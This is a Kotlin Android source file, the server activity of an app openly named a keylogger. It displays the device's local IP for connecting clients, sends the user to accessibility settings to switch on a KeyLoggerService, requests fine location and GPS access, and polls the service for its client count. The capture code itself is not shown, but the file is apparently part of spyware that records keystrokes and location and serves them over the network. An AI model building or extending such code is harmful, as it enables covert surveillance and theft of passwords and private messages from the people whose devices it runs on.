package com.example.keylogger.server

import android.content.Intent
import android.os.Bundle
import android.widget.TextView
import androidx.appcompat.app.AppCompatActivity
import java.net.Inet4Address
import java.net.NetworkInterface
import android.Manifest
import android.content.BroadcastReceiver
import android.content.Context
import android.content.IntentFilter
import android.content.pm.PackageManager
import android.provider.Settings
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import androidx.localbroadcastmanager.content.LocalBroadcastManager
import com.example.keylogger.R
import com.example.keylogger.databinding.ActivityServerBinding
import com.example.keylogger.utils.isAccessibilityServiceEnabled
import com.example.keylogger.utils.isGPSEnabled


class ServerActivity : AppCompatActivity() {

    private lateinit var binding: ActivityServerBinding

    private val broadcastReceiver = object : BroadcastReceiver() {
        override fun onReceive(context: Context?, intent: Intent?) {
            val message = intent?.getStringExtra("message_key")
            binding.tvClientNumber.text = message
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        binding = ActivityServerBinding.inflate(layoutInflater)
        setContentView(binding.root)

        val ipAddress = getLocalIpAddress()

        binding.tvIP.text = "Server IP: $ipAddress"

        binding.optionsAccessibilityService.setOnClickListener{
            startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS))
        }

        binding.optionsGeoPermission.setOnClickListener{
            checkLocationPermission()
        }

        binding.optionsGps.setOnClickListener{
            startActivity(Intent(Settings.ACTION_LOCATION_SOURCE_SETTINGS))
        }
        val intentFilter = IntentFilter(ServerActivity::class.java.name)
        LocalBroadcastManager.getInstance(this).registerReceiver(broadcastReceiver, intentFilter)

    }

    override fun onResume() {
        super.onResume()
        checkAccessibilityService()
        checkLocationPermission()
        checkGpsStatus()
        sendMessageToService("Tell me clients number")
    }

    override fun onDestroy() {
        super.onDestroy()
        LocalBroadcastManager.getInstance(this).unregisterReceiver(broadcastReceiver)
    }

    private fun checkAccessibilityService(){
        val accessibilityServiceEnabled = isAccessibilityServiceEnabled(KeyLoggerService::class.java)
        if(accessibilityServiceEnabled){
            binding.tvStatusAccessibilityService.text = getString(R.string.enabled)
        }
        else{
            binding.tvStatusAccessibilityService.text = getString(R.string.disabled)
        }

    }

    private fun getLocalIpAddress(): String {
        return try {
            NetworkInterface.getNetworkInterfaces().asSequence()
                .flatMap { it.inetAddresses.asSequence() }
                .filter { it is Inet4Address && !it.isLoopbackAddress }
                .map { it.hostAddress }
                .firstOrNull { it.startsWith("192.168") || it.startsWith("172.") || it.startsWith("10.") }
                ?: "IP not found"
        } catch (e: Exception) {
            e.printStackTrace()
            ""
        }
    }

    private fun checkLocationPermission() {
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION)
            != PackageManager.PERMISSION_GRANTED) {
            ActivityCompat.requestPermissions(this,
                arrayOf(Manifest.permission.ACCESS_FINE_LOCATION),
                0)
            binding.tvStatusGeo.text = getString(R.string.disabled)
        }
        else{
            binding.tvStatusGeo.text = getString(R.string.enabled)
        }
    }

    private fun checkGpsStatus(){
        val gpsEnabled = isGPSEnabled()
        if(gpsEnabled){
            binding.tvStatusGps.text = getString(R.string.enabled)
        }
        else{
            binding.tvStatusGps.text = getString(R.string.disabled)
        }
    }

    override fun onRequestPermissionsResult(
        requestCode: Int,
        permissions: Array<String>,
        grantResults: IntArray
    ) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        when (requestCode) {
            0 -> {
                if ((grantResults.isNotEmpty() && grantResults[0] == PackageManager.PERMISSION_GRANTED)) {
                    binding.tvStatusGeo.text = getString(R.string.enabled)
                } else {
                    binding.tvStatusGeo.text = getString(R.string.disabled)
                }
            }
        }
    }

    private fun sendMessageToService(message: String) {
        val intent = Intent(KeyLoggerService::class.java.name)
        intent.putExtra("message_key", message)
        LocalBroadcastManager.getInstance(this).sendBroadcast(intent)
    }
}


